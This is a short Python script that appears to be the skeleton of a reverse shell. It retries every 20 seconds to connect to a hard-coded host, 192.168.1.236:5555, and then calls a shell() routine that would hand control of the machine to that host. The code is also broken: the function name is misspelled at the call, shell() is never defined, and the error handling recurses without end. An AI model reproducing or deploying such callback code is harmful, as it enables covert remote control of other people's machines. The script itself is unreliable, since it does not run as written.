import socket
import time

def conection ():
       while True:
               time.sleep(20)  
               try:
                       s.connect(('192.168.1.236' ,5555))
                       shell()
                       s.close()
                       break
               except:
                conection()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
      